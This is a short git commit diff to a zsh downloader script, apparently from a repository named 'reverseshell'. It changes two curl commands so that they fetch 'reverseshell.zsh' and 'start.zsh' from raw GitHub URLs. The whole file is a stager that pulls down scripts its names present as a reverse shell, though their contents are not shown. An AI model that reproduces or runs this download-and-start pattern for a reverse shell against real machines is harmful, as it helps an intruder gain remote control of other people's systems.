cf13739eb3332d92b12c4662bc6672d109ac4f38
mmilunicmobile <62996888+mmilunicmobile@users.noreply.github.com>
2022-02-10 23:02:47 -0500

    Update download.zsh

--- download.zsh
+++ download.zsh
@@ -1,2 +1,2 @@
-curl -L -o reverseshell.zsh https://github.com/mmilunicmobile/reverseshell/blob/main/reverseshell.zsh
-curl -L -o start.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/start.zsh
+curl -o reverseshell.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/reverseshell.zsh
+curl -o start.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/start.zsh
